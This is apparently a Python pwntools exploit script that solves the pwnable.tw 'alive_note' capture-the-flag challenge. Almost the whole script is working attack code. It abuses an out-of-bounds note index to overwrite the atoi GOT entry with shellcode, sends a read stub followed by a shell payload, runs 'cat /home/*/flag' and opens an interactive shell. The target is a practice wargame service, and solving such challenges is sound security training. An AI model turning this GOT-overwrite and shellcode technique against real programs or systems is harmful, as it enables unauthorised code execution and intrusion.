#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

# available char:0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
from pwn import *
#context.log_level="debug"
pwn_file="./alive_note"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("chall.pwnable.tw",10300)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def passed(code):
    for i in code:
        if i in "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz":
            return False
    return True

def show(index):
    conn.sendlineafter("Your choice :","2")
    conn.sendlineafter("Index :",str(index))
    return conn.recvline()[len("Name : "):]

def add(index,name):
    conn.sendlineafter("Your choice :","1")
    conn.sendlineafter("Index :",str(index))
    conn.sendlineafter("Name :",name)
    #conn.recvuntil("Done !\n")

def delete(index):
    conn.sendlineafter("Your choice :","3")
    conn.sendlineafter("Index :",str(index))

code="""
    push eax
    jno .+0x6c
"""
add(-1,"tets")
for i in range(1224):
    print i
    add(-1,"test")
add(0,"test")
for i in range(6):
    add(-1,"test")
delete(0)
add((elf.got["atoi"]-elf.symbols["note"])/4,asm(code))
debug()
code="""
    xor eax,eax
    xor edx,edx
    mov al,3
    mov dl,0x40
    int 0x80
"""
read_shell_code=asm(code,arch="i386")
conn.sendlineafter("Your choice :",read_shell_code)
conn.sendline(read_shell_code+asm(shellcraft.sh()))
conn.sendline("cat /home/*/flag")
conn.interactive()
